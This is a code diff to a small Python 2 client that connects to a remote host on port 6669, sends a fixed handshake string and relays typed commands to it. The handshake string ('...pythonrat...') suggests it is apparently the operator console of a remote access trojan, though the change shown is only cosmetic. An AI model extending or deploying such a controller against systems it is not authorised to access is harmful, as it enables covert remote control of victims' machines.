@@ -7,6 +7,7 @@ import os
 import time
 import threading
 
+
 #Might want to change default port at some point
 TIMEOUT = 30
 PORT = 6669
@@ -14,7 +15,7 @@ CURR_DIRECTORY = os.path.dirname(os.path.realpath(__file__))
 with open(CURR_DIRECTORY+"/help.txt", 'r') as inputhandle:
     HELPPROMPT = inputhandle.read()
 
-def listen(connection):
+def listen(connection, host):
     while True:
         buffer = ""
         while "!!" not in buffer:
@@ -24,17 +25,21 @@ def listen(connection):
         command = raw_input("")
         if command == "quit":
             connection.send("quit\n")
+            print "\nClosing Connection.\n"
             connection.close()
             break
         else:
+            print "\n[local -> %s: %s]"%(host,command)
             command += "\n"
             connection.send(command)
 
 
 def main():
     connection = socket.socket()
-    print HELPPROMPT
+
     while True:
+        os.system('/usr/bin/clear')
+        print HELPPROMPT
         cmd = raw_input("ECHI.localhost> ").lower()
 
         if cmd == "help":
@@ -47,7 +52,7 @@ def main():
 
                 connection.connect((host, PORT))
                 connection.send("gunclawpythonratniBBa")
-                listen(connection)
+                listen(connection, host)
 
             except socket.error:
                 print "Failed to connect to host IP."
